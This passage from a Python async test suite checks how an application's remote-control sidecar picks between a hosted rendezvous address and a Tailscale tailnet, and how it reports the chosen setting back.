                self.assertFalse(h.side.served_by_hosted)
                await h.side.handle({"t": "start", "always": True,
                                     "address": "relay-terminal.ai"})
                await h.until(lambda: h.state()["online"] and h.state()["on"],
                              what="always-on at the hosted rendezvous")
                self.assertTrue(h.side.served_by_hosted)
                self.assertEqual(h.state()["base"], h.hosted)
        run(main(), timeout=90)

    def test_tailscale_is_the_word_the_switch_remembers_not_this_machines_name(self):
        """Options › Remote stores the picker's kind, because the tailnet name is this machine's
        and the setting outlives the machine. The sidecar resolves it, and reports the word back
        so the chrome line reads "Remote control on · your tailnet"."""
        async def main():
            async with Always(address="tailscale", tailnet="spark.tail0.ts.net") as h:
                await h.until(lambda: h.state()["online"], what="online over the tailnet")
                state = h.state()
                self.assertEqual(state["address"], "tailscale")
                self.assertEqual(state["base"], "https://spark.tail0.ts.net")
                self.assertTrue(h.side.served_by_tailscale)
                self.assertFalse(h.side.served_by_hosted, "the hosted entry was not chosen")
        run(main(), timeout=90)
